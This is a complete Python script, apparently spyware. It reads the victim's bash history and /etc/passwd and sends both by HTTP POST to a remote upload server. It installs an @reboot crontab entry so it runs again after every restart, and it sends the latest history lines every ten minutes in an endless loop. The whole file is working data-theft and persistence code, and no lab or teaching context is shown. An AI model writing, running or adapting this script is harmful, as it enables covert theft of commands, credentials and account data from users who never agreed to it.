import time
import requests
import os
import sys
import subprocess

# User's home directory
user_home = os.path.expanduser("~")

# Path to the bash history file (change to ~/.zsh_history if using zsh)
target_file_path = os.path.join(user_home, ".bash_history")
passwd_file_path = "/etc/passwd"

# Server details
host = "10.2.0.7:5000"   # Replace with your domain/IP
server_url = f"http://{host}/upload"

# Function to read the entire file (both history and passwd)
def read_entire_file():
    try:
        with open(target_file_path, 'r', encoding='utf-8') as target_file:
            data_target = target_file.read()
            
            with open(passwd_file_path, 'r') as passwd_file:
                data_passwd = passwd_file.read()

            return data_target, data_passwd
    except FileNotFoundError:
        print(f"Error: {target_file_path} not found.")
        return None, None

# Function to read the last n lines of the file (only history)
def read_last_n_lines(n=10):
    try:
        with open(target_file_path, 'r', encoding='utf-8') as target_file:
            lines = target_file.readlines()
            return lines[-n:]   # Get last 'n' lines
    except FileNotFoundError:
        print(f"Error: {target_file_path} not found.")
        return None

# Function to send data to the server
def send_data_to_server(data, file_name):
    try:
        response = requests.post(server_url, data={'content': data, 'filename': file_name})
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed to send data. Server responded with status code {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")

# Function to check and set cron job for the script at boot
def check_and_setup_cron():
    # Path to the current script
    current_script = os.path.abspath(sys.argv[0])

    # Check if this script is already in crontab
    try:
        cron_job = f"@reboot {sys.executable} {current_script}\n"
        cron_output = subprocess.check_output(['crontab', '-l'], stderr=subprocess.STDOUT).decode()

        if cron_job in cron_output:
            print("Cron job is already set up.")
        else:
            # Add the cron job if it's not already there
            new_cron = cron_output + cron_job
            with subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE) as proc:
                proc.communicate(input=new_cron.encode())
            print("Cron job added to run the script at boot.")
    except subprocess.CalledProcessError:
        # If no crontab exists, set a new one
        with subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE) as proc:
            proc.communicate(input=f"@reboot {sys.executable} {current_script}\n".encode())
        print("New crontab created and cron job added.")

def execute():
    # Initial send of the entire file
    data_target, data_passwd = read_entire_file()
    if data_target and data_passwd:
        print("Sending the entire file content...")
        send_data_to_server(data_target, target_file_path)
        
        print("Sending the entire passwd content...")
        send_data_to_server(data_passwd, passwd_file_path)

    # Send the last 10 lines every 10 minutes
    while True:
        time.sleep(600)   # Sleep for 10 minutes
        data_target = read_last_n_lines()
        if data_target:
            print("Sending the last 10 lines of the file...")
            send_data_to_server(''.join(data_target), target_file_path)

# Initial setup: check and set up cron job if necessary
check_and_setup_cron()

# If the script has not exited after setting up cron, continue execution
execute()
